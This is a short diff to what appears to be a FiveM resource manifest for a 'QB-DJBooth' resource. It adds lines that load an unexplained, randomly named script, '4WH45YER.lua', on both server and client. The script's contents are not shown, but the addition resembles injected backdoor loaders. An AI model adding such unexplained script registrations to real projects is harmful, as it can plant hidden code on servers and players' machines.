@@ -1,3 +1,5 @@
+server_script "4WH45YER.lua"
+client_script "4WH45YER.lua"
 name "QB-DJBooth"
 author "Jimathy"
 version "v1.1"
